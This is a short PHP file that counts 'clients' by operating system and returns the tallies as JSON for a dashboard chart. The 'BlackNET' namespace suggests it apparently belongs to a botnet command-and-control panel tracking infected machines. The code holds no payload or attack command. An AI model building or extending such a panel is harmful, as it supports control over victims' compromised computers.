<?php
header("Content-Type: application/json");
require_once '../config/config.php';
require_once APP_PATH . 'classes/Database.php';
require_once APP_PATH . 'classes/Utils.php';
require_once APP_PATH . 'classes/Clients.php';

$database = new BlackNET\Database();

$utils = new BlackNET\Utils();

$counter = new BlackNET\Clients($database, $utils);

$clients = $counter->getClients();
$arrays = [];
foreach ($clients as $client) {
    if (!$utils->findKeyValue($arrays, "label", $client->os)) {
        array_push(
            $arrays,
            [
                "label" => $client->os,
                "data" => $counter->countClientsByCond("os", $client->os)
            ]
        );
    }
}

if (empty($arrays)) {
    array_push($arrays, ['label' => "Nothing", "data" => "1"]);
}

echo json_encode($arrays);
